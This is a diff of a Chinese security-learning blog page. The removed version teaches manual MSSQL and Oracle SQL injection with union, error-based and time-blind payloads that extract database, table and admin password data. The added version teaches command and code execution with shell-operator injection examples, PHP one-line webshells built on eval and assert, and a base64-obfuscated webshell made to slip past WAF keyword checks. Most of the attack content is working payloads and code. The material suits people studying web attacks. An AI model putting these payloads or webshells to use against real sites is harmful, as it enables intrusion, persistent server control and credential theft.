@@ -6,23 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>MSSSQL的手工注入 | Hexo</title>
+  <title>命令执行原理与实践 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="MSSQL数据库注入的利用MSSQL内置函数（1）host_name() ：返回服务器端计算机名称 （2）db_name () ：返回当前数据库的名称 （3）current_user：返回当前数据库的用户名 （4）subString (string,m,n) ：字符串截取函数，截取从第m个字符到第n个字符 （5）CHAR() ：ascii转字符函数 （6）@@version：查看数据库版本 （7）">
+  <meta name="description" content="扩展RCE：  remote command execution 远程命令执行，例如ipconfig–显示IP信息 remote code execution 远程代码执行，例如echo 1–1  注：文件上传也是RCE漏洞 PHP中能够执行系统命令的函数：exec、system、passthru、shell_exec、popen ping 127.0.0.1 | whoami        &#x2F;&#x2F;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MSSSQL的手工注入">
-<meta property="og:url" content="http://example.com/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="命令执行原理与实践">
+<meta property="og:url" content="http://example.com/2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="MSSQL数据库注入的利用MSSQL内置函数（1）host_name() ：返回服务器端计算机名称 （2）db_name () ：返回当前数据库的名称 （3）current_user：返回当前数据库的用户名 （4）subString (string,m,n) ：字符串截取函数，截取从第m个字符到第n个字符 （5）CHAR() ：ascii转字符函数 （6）@@version：查看数据库版本 （7）">
+<meta property="og:description" content="扩展RCE：  remote command execution 远程命令执行，例如ipconfig–显示IP信息 remote code execution 远程代码执行，例如echo 1–1  注：文件上传也是RCE漏洞 PHP中能够执行系统命令的函数：exec、system、passthru、shell_exec、popen ping 127.0.0.1 | whoami        &#x2F;&#x2F;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2021/04/29/OhNUvZpQjostDn8.png">
-<meta property="og:image" content="https://i.loli.net/2021/04/29/iPQkc8Xvyl3UVbW.png">
-<meta property="article:published_time" content="2021-04-24T01:45:05.000Z">
-<meta property="article:modified_time" content="2021-04-29T09:19:03.332Z">
+<meta property="article:published_time" content="2021-05-09T08:19:30.000Z">
+<meta property="article:modified_time" content="2021-05-14T11:56:38.930Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="安全进阶">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/04/29/OhNUvZpQjostDn8.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -158,209 +155,86 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-安全进阶/MSSSQL的手工注入" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-安全进阶/命令执行原理与实践" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      MSSSQL的手工注入
+      命令执行原理与实践
     </h1>
   
 
         
-        <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2021-04-24T01:45:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-24</time>
+        <a href="/2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/" class="archive-article-date">
+  	<time datetime="2021-05-09T08:19:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="MSSQL数据库注入的利用"><a href="#MSSQL数据库注入的利用" class="headerlink" title="MSSQL数据库注入的利用"></a>MSSQL数据库注入的利用</h2><h3 id="MSSQL内置函数"><a href="#MSSQL内置函数" class="headerlink" title="MSSQL内置函数"></a>MSSQL内置函数</h3><p>（1）host_name() ：返回服务器端计算机名称</p>
-<p>（2）db_name () ：返回当前数据库的名称</p>
-<p>（3）current_user：返回当前数据库的用户名</p>
-<p>（4）subString (string,m,n) ：字符串截取函数，截取从第m个字符到第n个字符</p>
-<p>（5）CHAR() ：ascii转字符函数</p>
-<p>（6）@@version：查看数据库版本</p>
-<p>（7）ISNULL(NULL,m) ：判断查询是否带有NULL，有则用m替换</p>
-<pre><code class="sql">select ISNULL(db_name(),0)    -- 若当前数据库为dvwa，查询结果为dvwa
-select ISNULL(NULL,123)    -- 查询结果为123</code></pre>
-<p>（8）CAST(a as type) 字符类型转换，将a装换为type类型，如果转换失败会将a结果显示在页面上</p>
-<p>（9）object_id() 根据表名返回数据库表名ID</p>
-<p>（10）object_name() 根据ID返回数据库表名</p>
-<p>（11）col_name ( object_id , column_id )函数 ：返回指定表中指定字段（列）的名称</p>
-<h3 id="内置系统表"><a href="#内置系统表" class="headerlink" title="内置系统表"></a>内置系统表</h3><p>（1）sysdatabases表：该表只保存在master数据库中，这个表中保存的是所有的库名,以及库的ID，和一些相关信息。</p>
-<p>name列存放着数据库名。</p>
-<pre><code class="sql">select name from master..sysdatabases;
-select name from master.dbo.sysdatabases;</code></pre>
-<p>（2）sysobjects表：SQL-SERVER的每个数据库内都有此系统表，它存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。以下是此系统表的字段名称和相关说明。</p>
+        <h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>RCE：</p>
 <ul>
-<li><strong>Name，id，xtype，uid，status</strong>：分别是对象名，对象ID，对象类型，所有者对象的用户ID，对象状态。当xtype=’U’ and status&gt;0代表是用户建立的表，对象名就是表名，对象ID就是表的ID值。</li>
-<li>name列 存放着数据库的所有的表名 。</li>
+<li>remote command execution 远程命令执行，例如ipconfig–显示IP信息</li>
+<li>remote code execution 远程代码执行，例如echo 1–1</li>
 </ul>
-<pre><code class="sql">select name from sysobjects where xtype=&#39;U&#39;;
-select id from sysobjects where xtype=&#39;U&#39;;</code></pre>
-<p>（3）syscolumns表：该表位于每个数据库中。主要字段有： <strong>name ，id， colid</strong> ；分别是字段名称，表ID号，字段ID号，<strong>其中的 ID 是用sysobjects得到的表的ID号。</strong>name列存放着数据库的所有的列名</p>
-<pre><code class="sql">select name from syscolumns;
+<p>注：文件上传也是RCE漏洞</p>
+<p>PHP中能够执行系统命令的函数：exec、system、passthru、shell_exec、popen</p>
+<pre><code>ping 127.0.0.1 | whoami        //只会执行管道符后面的命令
 
--- 限定结果：
-select name from syscolumns where id=(select id from 数据库名..sysobjects where name=&#39;表名&#39;)</code></pre>
-<h2 id="MSSQL联合查询"><a href="#MSSQL联合查询" class="headerlink" title="MSSQL联合查询"></a>MSSQL联合查询</h2><p>（1）判断列数：order by N</p>
-<p>（2）判断数据回显位置 union select </p>
+ping 127.0.0.1 || whoami       //执行两个命令
+ping 127.0.0.1 &amp; whoami        //执行两个命令
+ping 127.0.0.1 &amp;&amp; whoami       //执行两个命令</code></pre>
+<p>一句话木马工作流程：</p>
 <ul>
-<li>union select：会把重复项去除</li>
-<li>union all select：全显示</li>
-<li>union select null,null,null…</li>
+<li>利用eval等危险函数引发远程代码执行，执行任意的PHP代码。</li>
+<li>利用PHP代码中的shell_exec、system等危险函数触发远程命令执行，查看电脑上的所有文件，并且可以执行系统命令，拿到了系统的权限</li>
 </ul>
-<p>（3）获取任意一行的方式</p>
-<pre><code class="sql">-- 获取前m行的数据，然后丢弃，再向下获取n行的数据
-select top n username from users where username not in (select top m username from users);
+<pre><code>菜刀工具一般只能用POST方式传参。
+万能写法：
+&lt;?php
+    @eval($_REQUEST[&#39;cmd&#39;]);   //request可以接受get、post、cookie传的参数
+?&gt;</code></pre>
+<p>常见代码执行函数：</p>
+<p>assert()  断言。将字符串当作代码执行一次进行判断，判断是否为True。</p>
+<pre><code>&lt;?php
+    @assert($_GET[&#39;cmd&#39;]);   //使用GET方法需要在URL中手动传参。
+?&gt;
 
--- 多个列拼接到一个列查询的方式
-select username+&#39;.&#39;+password from users;</code></pre>
-<h3 id="语句构造"><a href="#语句构造" class="headerlink" title="语句构造"></a>语句构造</h3><p>（1）UNION 操作符用于合并两个或多个 SELECT 语句的结果集。UNION 内部的 SELECT 语句必须拥有<strong>相同数量的列</strong>。列也必须拥有<strong>相同的数据类型。</strong>当UNION之前的select语句结果集为空时，<strong>查询结果将由UNION后的SELECT语句控制。</strong></p>
-<p><img src="https://i.loli.net/2021/04/29/OhNUvZpQjostDn8.png" alt="image-20210429161933859"></p>
-<p>（2）MSSQL数据库为强类型，union的查询类型要相同。例如原有查询语句由6列，可先将6个位置都设置为字符串类型’1’,’2’,’3’,’4’,’5’,’6’，根据报错信息逐个修改数据类型，最后得出每个位置的数据类型。</p>
-<p>（3）若提交后提示”text 数据类型不能选为 DISTINCT，因为它不可比”的错误，产生这一错误的原因是<strong>union语句合并查询时是默认去除重复项的，也就是默认执行了distinct操作。</strong>将union 改为 <strong>union all</strong> 不去除重复项，就能够解决这个报错。</p>
-<p>（4）判断数据回显位置时，需要先将原有查询语句置空。可以将union all后的某些位置改为字符串以确认该位置是否回显。</p>
-<p>（5）确定列数和回显位置后，即可在回显位置写入查询语句以获取需要的信息。</p>
-<ul>
-<li>获取当前数据库名称</li>
-</ul>
-<pre><code class="sql"> 1%&#39; union all select &#39;1&#39;,db_name(),&#39;3&#39;,&#39;4&#39;,5,6 --</code></pre>
-<ul>
-<li>获取所有数据库的名称</li>
-</ul>
-<pre><code class="sql">1%&#39; union all select &#39;1&#39;,name,&#39;3&#39;,&#39;4&#39;,5,6 from master..sysdatabases --</code></pre>
-<ul>
-<li>获取关键数据库中的表名信息</li>
-</ul>
-<pre><code class="sql">1%&#39; union all select &#39;1&#39;,name,&#39;3&#39;,&#39;4&#39;,5,6 from ST_WebCourse..sysobjects where xtype=&#39;U&#39; --</code></pre>
-<ul>
-<li>获取关键表中的列名信息</li>
-</ul>
-<pre><code class="sql">1%&#39; union all select &#39;1&#39;,name,&#39;3&#39;,&#39;4&#39;,5,6 from ST_Webcourse..syscolumns where id=(select id from ST_Webcourse..sysobjects where name=&#39;ST_admin&#39;) --</code></pre>
-<ul>
-<li>获取列名中的关键数据</li>
-</ul>
-<pre><code class="sql">1%&#39; union all select &#39;1&#39;,admin,&#39;3&#39;,&#39;4&#39;,5,6 from ST_admin -- 
-1%&#39; union all select &#39;1&#39;,pass,&#39;3&#39;,&#39;4&#39;,5,6 from ST_admin  -- </code></pre>
-<h2 id="MSSQL报错注入"><a href="#MSSQL报错注入" class="headerlink" title="MSSQL报错注入"></a>MSSQL报错注入</h2><p>（1）构造报错注入语句的基本步骤：</p>
-<p><img src="https://i.loli.net/2021/04/29/iPQkc8Xvyl3UVbW.png" alt="image-20210429170941757"></p>
-<p>（2）常见报错注入方式：mssql数据库对我们输入的语句进行查询的时候，<strong>通过int数据类型转换出错,回显出我们需要的结果。</strong></p>
-<p>（3）常见拼接方式：通过判断原始条件真，用and拼接注入语句</p>
-<p>（4）获取数据：</p>
-<ul>
-<li>判断数据库版本信息</li>
-</ul>
-<pre><code class="sql"> and 1=(select @@version)</code></pre>
-<ul>
-<li>获取当前数据库用户</li>
-</ul>
-<pre><code class="sql">and 1=(select current_user)</code></pre>
-<ul>
-<li>获取数据库名信息</li>
-</ul>
-<pre><code class="sql">1%&#39; and 1=(select top 1 name from master..sysdatabases where name not in (select top 0 name from master..sysdatabases))  --</code></pre>
-<ul>
-<li>获取当前数据库名信息</li>
-</ul>
-<pre><code class="sql">1%&#39; and 1=(select db_name()) –- </code></pre>
-<ul>
-<li>获取关键数据库中的表名信息</li>
-</ul>
-<pre><code class="sql">1%&#39; and 1=(select top 1 name from ST_WebCourse..sysobjects where xtype=&#39;U&#39; and name not in (select top 5 name from ST_WebCourse..sysobjects where xtype=&#39;U&#39;))  -- </code></pre>
-<ul>
-<li>获取关键表名中的列名信息</li>
-</ul>
-<pre><code class="sql">1%&#39; and 1=(select top 1 name from ST_WebCourse..syscolumns where id=(select id from ST_WebCourse..sysobjects where name=&#39;ST_Admin&#39;) and name not in (select top 2 name from ST_WebCourse..syscolumns where id=(select id from ST_WebCourse..sysobjects where name=&#39;ST_Admin&#39;)))-- 
+例如：http://127.0.0.1/assert.php?cmd=system(&#39;phpinfo()&#39;)</code></pre>
+<p>eval()：将字符串当做PHP代码执行。</p>
+<p>preg_replace()：对字符串进行正则表达式的查找，如果查找到结果，则将结果替换为正则表达式的内容。（区别preg_match()：进行正则表达式的查找）</p>
+<pre><code>preg_replace(&quot;正则表达式&quot;,&quot;字符串&quot;,&quot;若匹配成功后替换的字符串&quot;)</code></pre>
+<p>create_function()：用户利用该函数创造自定义函数</p>
+<pre><code>/*   注释掉后面的所有代码
+&lt;?php 
+//?code = 2;&#125;phpinfo();/*
+$code = $GET_[&#39;code&#39;];
+$str2 = &#39;echo test&#39;.$code.&quot;;&quot;;
+echo $str2;
+//$str2=echo test2;&#125;phpinfo();/*
+$func = create_function(&#39;$code&#39;,$str2);
 
--- 注：此处的ST_Admin可能需要进行16进制编码处理，而且最好使用的是SQL_En的方式。可以使用小葵进行编码处理</code></pre>
-<ul>
-<li>获取关键表中的关键字段的值</li>
-</ul>
-<pre><code class="sql">1%&#39; and 1=(select top 1 pass from ST_admin where pass not in (select top 0 pass from ST_Admin))  --</code></pre>
-<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>MSSQL（Microsoft SQL) = SQL server</p>
-<p>PHP连接MySQL数据库、MSSQL数据库流程一致</p>
-<pre><code>mysqli_connect mysqli_query mysqli_fetch_array
-mssqli_connect mssqli_query mssqli_fetch_array</code></pre>
-<p>注入的关键在于是否有一个数据库或者表存放了数据库名称、表名称、字段名称。</p>
-<p>其他数据库注入：</p>
-<ul>
-<li>其他数据库在哪里存放了数据库名称等信息</li>
-<li>其中的函数是否一致，若不一致</li>
-</ul>
-<p>MSSQL的内置数据库master，存在3张表</p>
-<ul>
-<li><p>sysdatabases存放数据库名称，name字段存放所有数据库名</p>
-</li>
-<li><p>sysobjecs存放表名称，name字段存放当前数据库的所有表名（注意，该表存在于每个数据库中）</p>
-</li>
-<li><p>sysColumns存放字段名称，name字段存放所有字段名（注意，该表存在于每个数据库中）</p>
-</li>
-</ul>
-<p>查询格式：</p>
-<pre><code>select * from db_name.user_name.table_name  #注意要加上操作用户的名称
-
-#查询数据库名称
-select name from master.dbo.sysdatabases
-也可以默认操作源
-select name from master..sysdatabases</code></pre>
-<p>mssql中没有group_concat、limit，若查询结果有多行，可用top n可以取到前n行的数据，若要查询指定行的数据：</p>
-<pre><code class="sql">-- 先查询m行的数据，然后把该数据丢弃，向下再查询n行的数据。例如：查询第2行的数据。
-select top 1 usernam from users where username not in (select top 1 username from users);</code></pre>
-<p>获取到数据库名称后，查询该数据库的所有表的名称</p>
-<pre><code class="sql">select name from db_name..sysobjects where xtype=&#39;U&#39;</code></pre>
-<p>获取所有字段。例如jiaofan数据库里的sl_admin表的所有字段</p>
-<pre><code class="sql">select name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;)
-
---查询第2行的字段值
-select top 1 name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;) and name not in(select top 1 name from jiaofan..syscolumns where id=(select id from jiaofan..sysobjects where name=&#39;sl_admin&#39;)
-)
-</code></pre>
-<p>简化查询，使用内置函数object_id()根据表名返回数据库表名ID。</p>
-<pre><code class="sql">select name from jiaofan..syscolumns where id=object(&#39;sl_admin&#39;)
-
---查询第2行的字段值
-select top 1 name from jiaofan..syscolumns where id=object(&#39;sl_admin&#39;) and name not in(select top 1 name from jiaofan..syscolumns where id=object(&#39;sl_admin&#39;))</code></pre>
-<p>msssql为强类型数据库，union查询的列数和类型必须相同，因此联合查询前需要判断数据类型。</p>
-<p>union all select</p>
-<p>报错注入：</p>
-<ul>
-<li>判断数据库基本信息：and 1=(select @@version)</li>
-<li>获取当前数据库用户：and 1=(select current_user)</li>
-</ul>
-<pre><code class="sql">select * from jiaofan..users where id=1 and 1=(select db_name())
-
-%&#39; and 1=(select name from jiaofan..sysobjects where xtype=&#39;U&#39;) -- 
-
-%&#39; and 1=(select top 1 name from jiaofan..sysobjects where xtype=&#39;U&#39; and name not in(select top 1 name from jiaofan..sysobjects where xtype=&#39;U&#39;)) -- </code></pre>
-<p>时间型盲注：waitfor delay ‘3’ </p>
-<pre><code class="sql">if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39;
-
-select 1 where 1=1 if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39;
-
-%&#39; if ((select substring(user,1,1))=&#39;d&#39;) waitfor delay &#39;0:0:3&#39;-- </code></pre>
-<p>mysql – 一个账号可以访问所有的表</p>
-<p>mssql –一个账号可以访问所有的表，但是访问时必须表明自己的身份</p>
-<p>Oracle – 一个账号只能管理一个数据库</p>
-<p>oracle 查询需要带上表名，dual万能表。</p>
-<pre><code>select 1,2,3 from dual       </code></pre>
-<p>查询当前数据库的所有表名</p>
-<pre><code>select table_name from user_tables</code></pre>
-<p>查询表名为xxx的所有字段名</p>
-<pre><code>select column_name from user_tab_columns where table_name=&#39;xxx&#39;</code></pre>
-<p>联合查询：</p>
-<pre><code>-1&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3&#39; from dual --  
-
-
--1&#39; union select table_name,&#39;2&#39;,&#39;3&#39; from user_tables where rownum=1 --  //查询到一张表T_USER
-
--1&#39; union select column_name,&#39;2&#39;,&#39;3&#39; from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 --  //查询到一个字段SUSER
-
--1&#39; union select SUSER,&#39;2&#39;,&#39;3&#39; from T_USER where rownum=1 --  </code></pre>
+相当于：
+function FT($code)&#123;
+    echo test2;&#125;phpinfo();/*
+&#125;
+?&gt;</code></pre>
+<p>array_map函数、print_r()类似于echo，但会产生换行。</p>
+<p>call_user_func </p>
+<p>call_user_func_array</p>
+<p>ASP一句话木马</p>
+<p>wscript.exe文件</p>
+<h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><p>（1）能够绕过WAF的一句话木马：关键字检测</p>
+<pre><code>assert进行base64编码得YXNzZXJ0
+$a = YXNzadminZXJ0;
+$b = str_replace(&#39;admin&#39;,&#39;&#39;,$a);
+$c = base64_decode($b);  //assert
+$c($_POST[&#39;cmd&#39;]);</code></pre>
+<p>（2）过狗一句话不能使用eval函数构造。因为eval是一个语言构造器而不是一个函数，不能被可用函数调用。eval只会被当做普通的字符串，而不是当做函数执行，通常使用assert等其他函数。</p>
+<p><strong>可变函数</strong>：即变量名前加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。</p>
 
       
 
@@ -451,7 +325,7 @@ select 1 where 1=1 if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MSSSQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -465,18 +339,9 @@ select 1 where 1=1 if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39
   
 <nav id="article-nav">
   
-    <a href="/2021/04/27/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/XSS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          XSS注入原理与实践进阶
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/04/24/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/MySQL%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">MySQL的手工注入</div>
+    <a href="/2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">文件包含漏洞的原理与实践</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -503,7 +368,7 @@ select 1 where 1=1 if ((select user)=&#39;dbo&#39;) waitfor delay=&#39;0:0:3&#39
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">MSSQL数据库注入的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">MSSQL内置函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%B3%BB%E7%BB%9F%E8%A1%A8"><span class="toc-number">1.2.</span> <span class="toc-text">内置系统表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.</span> <span class="toc-text">MSSQL联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E5%8F%A5%E6%9E%84%E9%80%A0"><span class="toc-number">2.1.</span> <span class="toc-text">语句构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">MSSQL报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">4.</span> <span class="toc-text">扩展</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">1.</span> <span class="toc-text">扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">1.1.</span> <span class="toc-text">过狗一句话</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
